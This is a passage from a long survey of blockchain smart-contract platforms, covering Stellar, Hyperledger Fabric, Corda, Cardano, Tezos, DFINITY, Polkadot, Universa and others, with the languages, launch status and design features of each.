just using the C# syntax, they are using the full tried and tested C# package supplied by Microsoft.Because smart contracts must execute deterministically, they cannot use all capabilities of the C# language or all the\u00a0.NET Core libraries. The Stratis smart contracts suite includes a validation tool that checks for any non-deterministic elements in any smart contracts that you write.They also have introduced the concept of gas which is identical to the concept of gas in ethereum.Learning Resources: Stratis smart contract Docs, Stratisplatform17. StellarPros:Faster, cheaper and more secure than Ethereum smart contract platform.Smart Contract Language: No specific languageStatus: LiveExplanation: Stellar smart contracts (SSC) are much different from Ethereum smart contracts. They are not Turing complete and are implemented as an agreement between multiple parties and enforced by transactions. Below you see a comparison between Stellar and Ethereum. Notice the huge difference in cost and confirmation time. A single transaction on the Stellar network costs only ~$0.0000002!Source: https://www.stellar.org/blog/using-stellar-for-ico/SSCs can be written in any language the Stellar community provides an API for (JavaScript, Python, Golang, PHP,\u00a0\u2026). You can find an example of a smart contract in PHP here.An SSC is expressed as compositions of transactions that are connected and executed using various constraints. The following are examples of constraints that can be considered and implemented when creating SSCs\u00a0:Multisignature\u200a\u2014\u200aWhat keys are needed to authorize a certain operation? What parties need to agree on a circumstance in order to execute the steps?Multisignature is the concept requiring signatures of multiple parties to sign transactions stemming from an account. Through signature weights and thresholds, representation of power in signatures is created.Batching/Atomicity\u200a\u2014\u200aWhat operations must all occur together or fail? What must happen in order to force this to fail or pass?Batching is the concept of including multiple operations in one transaction. Atomicity is the guarantee that given a series of operations, upon submission to the network if one operation fails, all operations in the transaction fails.Sequence\u200a\u2014\u200aIn what order should a series of transactions be processed? What are the limitations and dependencies?The concept of sequence is represented on the Stellar Network through sequence number. Utilizing sequence numbers in transaction manipulation, it can be guaranteed that specific transactions do not succeed if an alternative transaction is submitted.Time Bounds\u200a\u2014\u200aWhen can a transaction be processed?Time bounds are limitations on the time period over which a transaction is valid. Using time bounds enables time periods to be represented in an SSC.Learning Resources: Stellar smart contract Docs, Stellar18. HyperLedger FabricPros:Highly modular platform which allows you to have high control over its performance, scalability and security.Cons:As the contracts are deployed on peers(nodes) rather than on network, one has to deploy the contract code on every node(endorsers) on the network.Smart Contract Language: GoLang, NodejsStatus: LiveExplanation: HyperLedger Fabric is one of the many projects in the HyperLedger Umbrella.Hyperledger Fabric (HLF) likes to call its smart contracts \u2018chaincode\u2019. HLF is an enterprise permissioned blockchain, built with great flexibility, which makes it very useful for businesses as their business rules change after approximately 7 years. Most other blockchains are not built considering flexibility.HyperLeger Fabric Chaincode FlowHyperledger Fabric itself was written on Go language, so its smart contracts support this language as well. Benefits? Golang is a very efficient language with a fast compile time.It has a simple contract structure\u00a0. The three most important functions are:PutState: Create new asset or update existing one.GetState: Retrieve asset.GetHistoryForKey\u00a0: Retrieve history of changes.DelState: \u2018Delete\u2019 asset.Note on DelState: HLF uses a state database that stores keys and their values. This is different from the sequence of blocks that make up the blockchain. A key and its associated value can be removed from the state database using the DelState function. However, this does not mean that there is an alteration of blocks on the blockchain.The removal of a key and value would be stored as a transaction on the blockchain just as the prior addition and any modifications were stored as transactions on the blockchain.The history of a key can be retrieved after the key is deleted. There is a GetHistoryForKey() function that retrieves the history and part of its response is an IsDeleted flag that indicates if the key was deleted. It would be possible to create a key, delete the key, and then create the key again; the GetHistoryForKey() function would track such a case.Learning Resources: HLF chaincode Docs19. CordaPros:Tailor-made for financial agreements.Cons:Each CorDapp is installed at the level of the individual node, rather than on the network itself.Smart Contract Language: Java, KotlinStatus: LiveExplanation:What is a\u00a0CorDapp?CorDapps (Corda Distributed Applications) are distributed applications that run on the Corda platform. The goal of a CorDapp is to allow nodes to reach agreement on updates to the ledger. They achieve this goal by defining flows that Corda node owners can invoke through RPC calls.Note: Each CorDapp is installed at the level of the individual node, rather than on the network itself.CorDapp InfrastuctureCorDapps are made up of the following key components:1. States, defining the facts over which agreement is reachedStates:States represent on-ledger facts.States are evolved by making the current state as historic and creating an updated state.Each node has a vault where it stores any relevant states to itself.2. Contracts, defining what constitutes a valid ledger updateContract:A valid transaction must be accepted by the contract of each of its input and output statesContracts are writte in a JVM programming language e.g. Java or KotlinContract execution is deterministic and its acceptance of a transaction is based on the transaction\u2019s contents aloneIn cases, where transaction validity depend on some external piece of information, such as an exchange rate. In these cases, an oracle is required.Oracles:A fact can be included in a transaction as part of a command, An oracle is a service that will only sign the transaction if the included fact is true3. Services, providing long-lived utilies within the nodeNodes:A node is JVM run-time with a unique network idetity running the Corda softwareThe node has two interfaces with the outside world:A network layer, for interacting with other nodesRPC, for interacting with the node\u2019s ownerThe core elements of the architecture are:A persistence layer for storing dataA network interface for interacting with other nodesAn RPC interface for interacting with the node\u2019s ownerA service hub for allowing the node\u2019s flows to call upon the node\u2019s other servicesA cordapp interface and provider for extending the node by installing CorDapps5. Serialisation whitelistes, restricting what types your node will receive off the wireWriting a CorDappCorDapps can be written in either Java, Kotlin, or a combination of the two. Each CorDapp component takes the form of a JVM class that subclasses or implements to a Corda library type:Flows subclass (FlowLogic)State implement (ContractState)Contracts implement (Contract)Services subclass (SingletonSerializationToken)Learning Resources: Corda smart contract Docs, The Corda Team20. NeblioSmart Contract Language: C++, Python, Go, JS, Ruby,\u00a0.NET, Java, Node.jsStatus: Not LiveExplanation: NTP1(Neblio Token Protocol-1) supports the creation of smart contracts created via a set of rules used in the protocol to direct or restrict the movement of tokens. For example a token issuer can set a fee structure for transactions of that token that direct fees to a certain address. Lockup and Expiration rules can be used to move a token to a predetermined address or used to completely invalidate a token after a certain amount of time or on a certain date. Rules can also be used to generate contracts that restrict the addresses tokens can be transferred to, or the addresses allowed to generate new tokens, if any. The way that multiple smart contract languages is possible, is that built into each node there will be RESTful API server that handles all of the API calls and responses for interacting with the Neblio network and blockchain.Learning Resources: Nebilo Docs21. ViacoinSmart Contract Language: JavaStatus: LiveExplanation: Viacoin uses RSK(Rootstock) to enable its smart contract functionality. Smart contracts will be compatible with Ethereum.Rootstock is a smart contract platform which has a two-way peg. Rootstock runs a turing complete Virtual machine called Rootstock Virtual Machine (which is also compatible with Ethereum virtual machine) and allows solidity compiled smart contracts to run.The anticipated release of Viacoin is 0.15.0 core, which will see the implementation of Merkelized Abstract Syntax Trees (MAST). MAST, quite simply, allows for smaller transaction sizes, which facilitates better for smart contracts. This is a key release required for Rootstock (RSK) smart contracts, which will give Viacoin Ethereum-like smart contracts. RSK recently released its first beta for a bitcoin smart contracts platform.Learning Resources: GithubViacoin Github | Viacoin Reddit | Viacoin Telegram22. CardanoPros:Heavily focused on making it easier to provide guarantees that a smart contract behaves as designed without hidden vulnerabilities.Smart Contract Language: Solidity, PlutusStatus: LiveExplanation: The design of the Cardano Computation Layer (CCL), Cardano\u2019s smart contracts platform, is heavily focused on making it easier to provide guarantees that a smart contract behaves as designed without hidden vulnerabilities. The CCL consists of two layers: a formally specified virtual machine and language framework, and formally specified languages that facilitate automated verification of human readable smart contract code.Cardano Smart contracts and\u00a0VMsThe lowest layer, called IELE, provides a virtual machine designed to make building formal verification tools easy, and a universal language framework for translating smart contracts from higher-level languages into executable instructions. Research and development of IELE is funded by IOHK and led by UIUC Professor and founder of Runtime Verification, Grigore Rosu. Rosu and team are applying insights from their research on KEVM, a formal semantics in the K framework for the Ethereum Virtual Machine, and KLLVM, a formal semantics in K for LLVM, to build a more secure and efficient virtual machine.Unlike the EVM, which is a stack-based machine, IELE will be a register-based machine, like LLVM. IELE will have an unbounded number of registers and will also support unbounded integers. Avoiding the use of a bounded stack and not having to worry about stack or arithmetic overflow will make specification and verification of smart contracts significantly easier. Like Ethereum, IELE will use gas to limit resource usage and prevent DoS attacks. This presents some challenges to formal verification that are considered \u201ctricky but manageable\u201d by the research team. IELE leverages the K framework to simplify the development of automated tools that verify smart contracts match specifications. This allows IELE to support smart contracts written in any programming language that has a formal semantics in K.One such language may be Simon. Briefly described in the Cardano vision paper, Simon is a highly constrained, domain specific transaction language that provides a precisely specified set of basic financial transaction primitives that can be combined to create more complicated contracts with verifiable properties. Not much else has been written about Simon, but it is reportedly inspired by concepts from the paper Composing contracts: an adventure in financial engineering, by Simon Peyton Jones and colleagues.Simon Peyton Jones is one of the principal designers of Haskell, a statically typed, purely functional language that is often used in applications where runtime bugs have a high cost (it is used to implement Ouroboros). Haskell\u2019s design makes it amenable to automated verification tools that can identify and eliminate defects early in the software development process. Another Haskell designer and ACM Fellow, Phil Wadler, is a programming languages advisor to IOHK, so it\u2019s no surprise that Cardano\u2019s primary high level, general purpose smart contract language, Plutus, incorporates many of the concepts behind Haskell.Plutus is a statically typed, functional language with a human readable, Haskell-like syntax. Like Haskell, Plutus translates to a simpler language, Plutus Core, that makes formal verification easier. Formal verification tools can help developers to reason about contracts and to prove certain properties about the behavior of the smart contract. These proofs can be a powerful tool to highlight and eliminate the primary sources of contract vulnerabilities such as handling of invalid input, type mismatches, nonobvious unintended code paths, confusion around scope, typos, overflows, etc. For example, a proof of the property that there is no code path in which the owner of a contract can be changed would have prevented vulnerabilities that led to both exploits of the Parity multisig wallet. This specific property is obvious in hindsight; it\u2019s entirely possible for important properties to be left out of a formal specifications, allowing vulnerabilities that only becomes obvious after they are exploited. So, while formal verification is a very powerful tool, it is only as effective as the human being(s) ability to cover all bases when creating a specification.Cardano plans to support other high level languages, including Solidity. However it supports Solidity for \u201cfor low assurance applications [and Plutus] for higher assurance applications requiring formal verification.\u201d While it\u2019s hard to imagine any smart contract writer choosing the low assurance option, support for Solidity will make it easier for Ethereum developers and perhaps some existing contracts to migrate to Cardano. The primary reason for developers and contracts to migrate to Cardano, however, won\u2019t be its support for Solidity, but rather its ability to reduce the risk of vulnerabilities that put funds at risk. If IELE, Plutus, and supporting verification tools can enable the development of smart contracts that are demonstrably free of the types of vulnerabilities that plague Solidity code, Cardano could become the platform of choice for deploying contracts that need better security around the funds they control (i.e. all smart contracts)Learning Resources: Cardano Docs23. TezosPros:Facilitates formal verification of on-chain code.Smart Contract Language: MichelsonStatus: LiveExplanation: Tezos plans to greatly improve security with Michelson, a new smart contracting language designed specifically to facilitate formal verification of on-chain code. Unlike Solidity, Michelson is not compiled to anything; it is a low level, stack-based, Turing-complete programming language that is directly interpreted by the Tezos virtual machine. So technically it is more analagous to EVM bytecode than Solidity, however it includes high-level constructs such as maps, sets, lambdas, cryptographic primitives, and contract-specific operations to make it easier for humans to read and write. It is purely functional, strongly typed, and statically type-checked to simplify the construction of correctness proofs and eliminate several types of vulnerabilities that have afflicted Solidity contracts.A correctness proof is not a universal proof that nothing bad can happen, but a proof that all of the assertions enumerated in a certain specification will be satisfied by the program. So if a developer creates a specification that includes an assertion that only authorized users can change the owner of a contract, then the verifier would catch the Parity multisig vulnerability before it got deployed. However, to be effective, the developer needs to think of the assertion (which is obvious only in retrospect) and include it in the specification before deploying the code and witnessing the attack.Although there is no substitute for human analysis and reasoning in preventing bugs, formal verification is a powerful, complementary tool that is appropriate in situations where bugs can have catastrophic consequences, such as in airplane software and smart contracts controlling large amounts of assets. The Ethereum community recognizes this and there are multipleprojects investigating the formal verification of smart contracts and the Ethereum virtual machine itself. The Ethereum community is also researching new programming languages such as Bamboo and Viper that are more suitable for formal verification and more constrained such that many vulnerabilities can be discovered by compilers rather than by hackers. Since these languages also compile to EVM code, it would be necessary to formally verify both the high-level code as well as the EVM bytecode produced (and/or the compiler producing the bytecode). In contrast, Michelson is interpreted directly by the Tezos VM so requires only a single correctness proof of the contract code.Once the Tezos blockchain is launched, Michelson will likely provide a programming environment that enables development of significantly safer smart contracts than Solidity by developers with less than expert-level capability. Currently there are at most only a handful of expert Michelson programmers, and being a new, stack-based language without many of the features programmers are used to, the learning curve may present an adoption hurdle for developers. However, Michelson provides a foundation upon which a higher level, more developer-friendly functional language that facilitates \u201cfull stack\u201d formal verification could be developed. There is currently active research and development on the Liquidity programming language, which provides an OCaml-like syntax and transpiles to and from Michelson.In Ethereum, a number of complementary scaling techniques such as sharding, payment channels, sidechains, and off-chain computation are being investigated. Whereas Tezos recognizes that off-chain mechanisms such as payment channels will be required for micropayments, they believe the best route to a massive on-chain scalability boost lies not in sharding but in recursive SNARK technology. SNARKs can be used to provide cryptographic proof of arbitrarily complex transactions, and recursively to provide a single proof for a block of transaction proofs, enabling a large number of transactions to be quickly validated on cheap hardware. According to Breitman this technology could completely eliminate the need for gas limits and allow users to sync the entire blockchain from genesis in less than one second, thereby making the centralization/throughput tradeoff unnecessary. Two key adoption hurdles are the computational cost to produce the recursive proofs and the requirement for a trusted setup, however recent advances suggest that this approach to massive scaling without centralizing may soon be viable.Learning Resources: Tezos Michelson Docs, Tezos24. DFINITYSmart Contract Language: SolidityStatus: Not LiveExplanation: DFINITY has labeled itself Ethereum\u2019s \u201ccrazy sister\u201d to express it\u2019s close genetic resemblance to Ethereum, differentiated by its obsession with performance and neuron-inspired governance model.The idea is that some contract / dapps might be best suited in an algorithmic governance platform rather than a \u2018code is law\u2019 style platform like Ethereum(debatable). The DFINITY project is currently somewhere between prototype and production; there is no public blockchain on which to deploy smart contracts at the time of writing.DFINITY\u2019s biggest selling point is the Blockchain Nervous System (BNS) and its high performance and scalabilty. But one of the thing which will affect our understanding about smart contracts(as mentioned above) is its on-chain governance.DFINITY\u2019s on-chain governance mechanism allows for protocol upgrades (and much more) without the need to hardfork the network. This is somewhat similar to the idea of Tezos but DFINITY will use the EVM and solidity, so that any contract that can be deployed on Ethereum can also be deployed on DFINITY.Those who \u2018stake\u2019 their coins in a \u2018neuron\u2019 are given voting power proportional to their stake. The BNS is the collection of all the neurons in the network. Anyone can submit a proposal to the network and those who are staking their coins can vote on the proposals. A proposal can:Freeze smart contracts/dapps: The network might want to freeze dapps that are used for criminal activity, etcReverse transactions: In an event where a bug is discovered smart contract and millions of dollars are stolen or lost (like theDAO or Parity incident), the network can vote to return these lost funds, all without the need for a hard fork.Edit smart contract code: Imagine a popular dapp is launched to the network, millions of people use this dapp and a bug is discovered. On the Ethereum network, there is nothing you can do to fix this dapp. All you can do is take the code, fix it and launch an entirely new smart-contract. On DFINITY, you could submit a proposal to the network, and have the bug fixed if the community votes to do so. The only way to edit a smart contract like this on the Ethereum network is to hardfork.Upgrade the protocol: Imagine if Bitcoin was able to absorb the features of all of the alt-coins that were created after Bitcoin. Instead of creating new currencies for Zcash, Ethereum, etc., What if Bitcoin just added features for private transactions, smart contracts, etc. There would be no need for these other currencies. This is the potential power of DFINITY, since the BNS can upgrade the protocol without the need for a hardfork. The reason Bitcoin can\u2019t do this is because 1. People cannot agree on which features to add to bitcoin and 2. It would take a hardfork to add new protocol features such as these ones mentioned. DFINITY solves these problems.Learning Resources: DFINITY Docs, Dominic Williams25. BOSCoinSmart Contract Language: Web Ontology LanguageStatus: Not LiveExplanation: Unlike most of the smart contract designs mentioned above, BOSCoin\u2019s Trust Contracts are designed with the Web Ontology Language and adopting automata theory, aims to be decidable. Lets have a closer look into these components and how they work together.Web Ontology\u00a0LanguageOWL stands for Web Ontology Language and is based on the W3C Semantic Web language. Under the BOS Platform Trust Contracts, the OWL component aims to interpret the language structure of the smart contracts including the coding and sentence strings.The World Wide Web Consortium (W3C), is an international community which develops open standards for the longevity of the World Wide Web to support the Web of data. Part of their work is to create a Semantic Web language aiming to represent rich and complex knowledge about things, groups of things, and relationship between things.The Semantic Web language has 5 main components:Linked Data: attributes that the database uses to understand languages i.e. dates and titles and part numbers and chemical propertiesVocabularies: languages broken down into their fundamental definitions (i.e. concepts and relationships)Query: the tool used to retrieve information from databasesInference: the reasoner that processes and interprets the set of data gathered (i.e. via rules or amalgamating various data from various sources)Vertical Applications: W3C\u2019s business venture component working with different industries to improve research and development, and collaboration\u200a\u2014\u200anot relevant to this article.From the W3C Semantic Web, BOS Platform will be utilizing Web Ontology Language. Ontologies are formalized vocabularies of terms, specifying definitions by describing their relationships with other terms within the ontology. OWL is used as a tool for applications to process information (as opposed to humans processing) allowing the system to interpret the meaning of vocabularies; where the information could be standard text sentences or code. The benefit of using OWL is the ability to feed from the multitude of ontologies included in the OWL repositories.Timed Automata\u00a0LanguageTimed Automata Language (TAL) is the validating agent in BOS Platform\u2019s Trust Contracts providing these smart contracts to be decidable. TAL stems from finite automata under automata theory, and is augmented with a timed component to its functionality\u200a\u2014\u200ahence it would be wise to first understand what automata theory is. Lucky for us there are various publications on this, and the Stanford University provides a good description:\u201c[Automaton are] automatic processes carrying out the production of specific processes.\u00a0\u2026 Automata theory deals with the logic of computation with respect to simple machines, referred to as automata. Through automata, computer scientists are able to understand how machines compute functions and solve problems, and more importantly, what it means for a function to be defined as computable or for a question to be described as decidable.\u201d\u200a\u2014\u200aStanford University.As mentioned above, finite automata is an extension of automata theory. Finite automata refers to a tool to model the logic of finite data and allows for understanding of the resulting state it will eventuate to. An example of this in practice is provided below modelling an automatic sliding door (diagram of door on the left, state diagram on the right):Schematic Diagram of Sliding Door from SIPSER, Michael (2006). Introduction to Computer Theory. Tomson Course Technology. USA.State Diagram of Sliding Door from SIPSER, Michael (2006). Introduction to Computer Theory. Tomson Course Technology. USA.In the model, the circles represent the states, the arrow represent the transitions. The far left arrow indicates the start state.The states of the system (for this example, the sliding door) are either OPEN or CLOSED; and for this particular automatic door the outputs can be provided below:Tabulated Sliding Door\u00a0Statesi.e. if the system went through the following events FRONT, REAR, NEITHER, FRONT, BOTH, NEITHER, REAR, NEITHER, the states would transition as below:States of the Sliding Door\u00a0exampleTimed automata introduces the system\u2019s clock as an input to the automaton. An example of using system clock is presented by a popular example of a lamp which, when the switch is pressed subsequently within a limited period of time, the lamp would dim instead of turning only on or off. The state diagram of this is represented below:Dimming Lamp State Diagram FEHNKER, Ansgar\u200a\u2014\u200aCOMP4151\u200a\u2014\u200aLecture 11a\u200a\u2014\u200aAlgorithmic Verification. University of New South Wales, AustraliaFrom the above Dimming Lamp State Diagram there are 3 states, Off, Dimmedand Bright. The transitions are initiated by a button switch where, if at off state, a single press of the switch would change the lamp state to Dimmed, and if presses within 1 measurement value (you can think of this as a second in terms of time) of the system\u2019s internal clock, the lamp state changes to Bright. A press of the switch either at the Bright state, or after 1 second of the previous button press, the lamp\u2019s state would be Off.OWL + TAL + BlockchainThe combination of OWL and TAL provide the fundamental basis for Trust Contracts. With current smart contracts written in code, the OWL component will interpret the structure of the code strings, whilst TAL will be able to model and confirm the logic of overall smart contract\u200a\u2014\u200afurthermore the information from where OWL and TAL will be sourced is aimed to be stored on the blockchain.From this we can ensure Trust Contracts are decidable prior to validation and execution of Trust Contracts\u200a\u2014\u200aensuring the system\u2019s integrity.Learning Resources: BOScoin26. Agoras\u00a0TauchainStatus: Not liveExplanation: To understand Agoras, we first need to explain the Tau-chain principle. That particular ecosystem is a generalization of many centralized and decentralized peer-to-peer networks including blockchain ventures. It has many different use cases ranging from software development to gaming and even decentralized storage. Agoras is an application running over Tau and offers a smart currency with a strong focus on peer-to-peer contracts.Agoras focuses on peer-to-peer smart contracts. For corporations, Agoras is a solution worth exploring. Companies often want to keep things private, and the smart contracts designed to accommodate such transactions are sufficient to make that happen. Agoras wants to focus on meaningful smart contracts first and foremost. This means these agreements will always adhere to predetermined settings and requirements, without any surprises for either party.Learning Resources: Agoras blog27. BurstPros:Turing complete smart contracts.Cons:High smart contract fee.Smart Contract Implementation: Automated Technologies (C/C++)Status: LiveExplanation: Burst was the first ever cryptocurrency to implement working, turing complete smart contracts in a live environment in the form of Automated Transactions (AT). Below is the flow: from creating a contract to final state change.Burst smart contract life\u00a0cycleDue to some problems Burst couldn\u2019t catch up with other platforms. As stated in an interview published on April 4, 2018:The main issue that I have with Burst ATs is that every opcode (line of code) that is run by a miner costs 1 burst. This makes running a very simple contract\u200a\u2014\u200asuch as sending burst back from the smart contract itself\u200a\u2014\u200acost around 20 Burst. If these costs are brought down to maybe 0.001 burst per opcode, it can be just as good as Ethereum or any other platform once we bring in compilers and such.Learning Resources: BurstAT wiki, Burstcoin_dev28. iOlitePros:Uses FAE (Fast Adaptation Engine), which is capable of converting natural language or any other desired programming language into smart contract code, thus opening the doors of world of smart contracts to a wider audience.Status: LiveExplanation: iOlite is a product which focuses on the mass adoption of smart contract technology by providing an easy to use engine which is capable of understanding natural language to be compiled to smart contract code. iOlite is the ideal solution if you don\u2019t want to spend time learning, instead just start creating smart contracts.iOlite use\u00a0caseiOlite is based on the research done at Stanford University. They invented the FAE (Fast Adaptation Engine), which is capable of converting natural language or any other desired programming language into smart contract code. The FAE is not just straightaway translating your input to code. The FAE depends on contributors (smart contract experts) that are able to define structures containing language expressions. Furthermore, these structures are tied to smart contract code they write. This allows the engine to browse the structures to find the right expression so it can compile the desired smart contract. Whenever a structure is used, a contributor gets iOlite tokens rewarded.As you can see, iOlite relies on their community to make the FAE successful. The FAE helps them by applying Machine Learning techniques to help it learn and adopt new structures more easily.iOlite Labs is currently focusing on Ethereum smart contracts with Solidity as there is a massive need.Travis Byrne from the iOlite team explained which languages can be used to create smart contracts. \u201cWhat this means is that not only can programmers (in formal languages such as Python, C, JavaScript, etc.) immediately use their existing skills to write smart contracts, but also average people with no programming knowledge whatsoever, can just as easily start developing with natural languages like English. iOlite is dissolving the existing technical learning boundaries for creating smart contracts.\u201dLearning Resources: iOlite Guide, iOliteiOlite Reddit | iOlite Github | iOlite Telegram29. ByteBallSmart Contract Language: Declarative languageStatus: LiveExplanation: DAGs is general have a high throughput and scalablity. But this comes with a cost; it is not possible for DAGs such as Byteball to support smart contracts as capable as of Ethereum\u2019s. This is because of its tree like structure.Byteball DAY structureIn case of Ethereum and other blockchains, this structure is linear. So, it\u2019s you can define the ordering of the transactions. Whereas DAGs do not care much about the ordering; they just care about if the transaction is valid or not(is the transaction conflicting). So, DAGs are good for contracts in which the order in which they(transactions) occur doesn\u2019t matter.Here is where Byteball is different from other DAGs. It has implemented oracles to solve this problem. What oracles do is that they keep the track of all the transactions and maintain a global order of all the transactions in the network. Thus using oracles it is possible to implement smart contracts which require the exact order in which the transactions occurred.Also, you don\u2019t need to be a developer to understand or compose these contracts, you don\u2019t need to trust a developer either. Everybody can easily see what the contract means, just like a regular legal contract.A smart contract in Byteball looks like this:Composing a Byteball smart\u00a0contractThis potentially opens the door of its smart contracts for a wider audience; even further across the developer community to the general public.Learning Resources: Byteball white paper, ByteballByteball Reddit | Byteball Github | Byteball Telegram30. XTRABYTESSmart Contract Language: No Specific LanguageStatus: Not LiveExplanation: DApp developers will be able to access XTRABYTES\u2019 core features and data through its Distributed Command Message API (DICOM API). The latter allows DApp code to be developed in a wide array of programming languages. Hence the term code-agnostic. All that will be needed is the ability to call on the API functions within specific code. This will allow developers from a wide array of fields to jump into coding XTRABYTES DApps quickly.Learning Resources: Xytrabytes Medium, XTRABYTES\u2122 (XBY)Xtrabytes Reddit | Xtrabytes Github | Xtrabytes Telegram31. PolkaDotStatus: Not LiveExplanation: A parachain (parallelizable chain) is a simpler form of blockchain, which attaches to the security provided by a \u201crelay chain\u201d rather than providing its own. The relay chain is called that because it not only lends security to attached parachains, but also provides a guarantee of secure message-passing between them. One key feature of parachains is that the computations they perform are inherently independent. Fully generalized systems of turing-complete smart contracts run into issues in determining which transactions will \u201ccollide\u201d with each other, meaning that transactions which could potentially be parallelized are often run in sequence, wasting valuable computation time. Drawing clear boundaries between parachains means that we can execute all of them at once without fear of collision\u200a\u2014\u200aif we have 10 parachains, we can perform 10 times the work using the same source of security.Polkadot will support both directly connected and fully sovereign but connectable chains. Parachains, or natively supported blockchains that gain consensus using the greater network\u2019s consensus mechanism, benefit from Polkadot\u2019s pooled security. Pooling security allows each parachain (and the relay chain) to utilize the entire network\u2019s set of validators to secure the overall network, meaning each parachain benefits from the network effect of the total ecosystem. If a parachain is compatible with Polkadot, it can leverage the security of Polkadot\u2019s consensus mechanism.Parachain and Bridge ecosystemFor other already existing projects with their own state-histories and methods of consensus, Bridges are the connecting layer that will allow them to link to Polkadot. The bridge will connect smart contract-capable blockchains to Polkadot without any modification to their native protocol. Parity Technologies\u2019 initial work focuses on bridges connecting two Ethereum-like chains. It can for example transfer value (balances between two chains) from an Ethereum Proof-of-Work (PoW) chain to an Ethereum Proof-of-Authority (PoA) chain and back.At their core, models like Bitcoin Script and the EVM were designed with the goal of interoperability in mind, but systems making use of these models pay the increased cost of execution for all parts of their implementation, not just those which are meant to be accessible from other systems running on the same network. By contrast, Polkadot parachains communicate with each other by asynchronous message passing, and as such only pay the cost of data uniformity at exactly the boundaries where parachains meet.Note that it\u2019s still possible to create a parachain that provides a framework for fully general, turing-complete smart contracts. A simple example would be a parachain powered by the EVM. Contracts implemented on this parachain would both benefit from and be inconvenienced by the generality and interoperability of Ethereum smart contracts for the reasons given above. The primary difference is that it\u2019s fully opt-in. We consider Polkadot\u2019s ability to integrate focused solutions while retaining the optionality of using extremely general frameworks to be one of its most powerful features.Learning Resources: PolkaDot Medium, PolkadotPolkadot Reddit | Polkadot GitHub | Pokadot Telegram32. RadixSmart Contract Language: JavaScript/TypeScriptStatus: Not LiveExplanation: Scrypto is a state machine which provides security and functional abstraction to virtual-machines that live on top of it. This enables any VM to interface (providing it can) and execute any script in any language.The planned JavaScript module will simply be a VM that interacts with the Scrypto state machine.Learning Resources: Radix developer Intro, Radix DLTRadix Reddit | Radix Github | Radix Telegram33. ExonumSmart Contract Language: Rust. Java bindings TBDStatus: LiveExplanation: Services allow specifying the business logic for Exonum applications. They are the main extension points of the framework, which play the same role as smart contracts in some other blockchains.Exonum Service ArchitectureDeveloping Exonum services is similar to service development in Web or in enterprise platforms; they have the same principal components.EndpointsA service has a set of endpoints (realized as REST APIs) using which the service can communicate with the outside world. The Exonum framework acts as middleware, dispatching requests among services and abstracting the intricacies of data (de)serialization, access control, and other typical middleware tasks away from service developers.There are 3 types of service endpoints:Transactions correspond to PUT or POST requests in RESTRead requests correspond to GET requests in RESTPrivate APIs represent administrative and maintenance endpoints, generally not accessible to the outside world.The key points differentiating Exonum smart contracts from other models used in blockchains are as follows:Restricted environment. Exonum executes only predefined request types, not allowing to execute untrusted code received from a client. This results in a more controlled environment, and makes it easier to argue about smart contract safetyNo isolation. Request processing is performed in the same execution context as the core of the system. This is beneficial for performance, although has certain security risksLocal state. Exonum services may define a local state, which is specific to the node on which the service is running. The local state can be used to manage secret information (e.g., private keys). The local state may be managed by private service endpoints. By utilizing the local state, services can be more proactive than their counterparts in other blockchains. For example, the anchoring service uses the local state to fully automate anchoring transaction signingSplit transaction processing. Transaction verification is a separate step of transaction processing. It is performed immediately after receiving the transaction, before applying the transaction to the blockchain state. Verification may include authentication checks (for example, verifying the transaction signature), as well as other structural checks over the transaction contents. At the same time, transaction verification has no access to the current blockchain stateLearning Resources: Exonum Docs, The Bitfury GroupExonum GitHub | Exonum Reddit | Exonum Telegram34. UniversaSmart Contract Language: JavascriptStatus: LiveExplanation: To understand how Universa\u2019s smart contracts work, we have to break the whole picture into smaller parts.THE PARTYEach participant in the Universa is represented by the notion of the party. The party could be completely anonymous or physically identified. There are several ways of identifying a party In the root contract the party could be identified by:By the public key, mentioned in the contract body (for example, as the issuer or owner).By the anonymous public key Id which allows identifying the party\u2019s public key without disclosing until to the first usage (for example to make anonymous purchases).The party could add any other details of itself (name, nick, social security or passport number, whatever) in the contract record.Inside the\u00a0contractPARTSDefinition. Immutable part that can\u2019t be changed in revisions. Contains issuer, issuing timestamp, permissions (some permissions could be also moved to the state), and any data the creator want to be immutable.State. The mutable section which could be changed in revisions. Contains revision number, creator and timestamp, reference to the origin and previous revision, changeable roles and (rarely) permissions and any mutable client data.Attachments. Any file, mentioned by mean of the signed reference in the definition or state.Universa network knows only definition and state, the rest is never sent to the network. It is important part as attachments may and often contain a sensitive and private information. While this information is well protected by mean of signed references in the contract state and definition, it is even better protected by not being transferred to the Universa network.So, the full contract is only exchanged between parties involved, where any appropriate transport could be used (email, messengers, clouds, USB flash, whatever). The immutability of the attachments is guaranteed by the signed references in the contract, which are in turn signed by the parties and approved by the network.So, the chain of trust is:Universa network approves the revision of the contract, provide the registration time and the immutability of the state and the definition.Parties that have signed the revision approve (by signing it) that the state and definition are correct, and that they possess all mentioned attachments and agree with them, whatever they are.Signed references in the state and definition guarantees immutability of the corresponding attachments located somewhere in the client storage.SCRIPTSThe smart contract could not be smart enough without it. Universa smart contracts allow Javascript to be included as an attachments. The script can implement actions to be performed by clients, generate new contracts, and process events in a completely automated way. The 3rd generation of the Universa client will be able to run as even as an autonomous web service or web application and, in the GUI client, work as a simple GUI application to perform workflow automation together with user interface. Our target is to allow smart contracts to be full-sized application, with all benefits of Universa platform and services incorporated.Other languages which compile to pure javascript, like Coffeescript, could also be used and even incorporated in the contract as another attachments, but at the execution time only the signed set of compiled javascript will be used.The scripts are executed by the client software and in the client\u2019s environment. The Universa network does not ever see the script, but it always check the result to conform with the contract definition and state. It means, that even if a script will perform some forbidden operation, the network will not accept the result. Generally, it is always simpler to specify few permissions and conditions limiting the allowed operations than trying to check the script source for hidden vulnerabilities. The permissions DSL is clean and straightforward, comparing to the script, and permission check performed remotely by the Universa can not be bypassed by the script, which works locally and is never even transferred to the Universa nodes.The usual script execution cycle is: scripts is being activated by the user or, in the server environment, some event, like incoming contract or payment notification from our Bitcoin integration service. The script then execute, modify its state (each script have some local storage to work with and can access its contract chain), create and approve with Universa new revisions and derived contracts, and, if need, send it over the network using any connected communication tools. Actually the script could be allowed to connect to any network service using HTTPS API.RepresentationSmart contract is a tree (structure or hash) of objects and could be stored in any modern format, such as JSON, YAML, XML, BOSS, whatever else that can hold arrays, structures, strings and numbers. YAML-based DSL representation is often used as new contract templates, inside the network contracts are always serialized with BOSS, as it is the best to keep binary data that are widely used in Universa (keys, signatures and binary IDs).THE CAPSULEEach smart contract is packed to the heavily protected signed container\u200a\u2014\u200athe capsule. The capsule consist of the body and set of extended signatures. The body includes a packed binary contract itself and set of extended signatures. Each extended signature signs the body and the own type, fingerprint and timestamp, so many types of electronic signatures could be used at 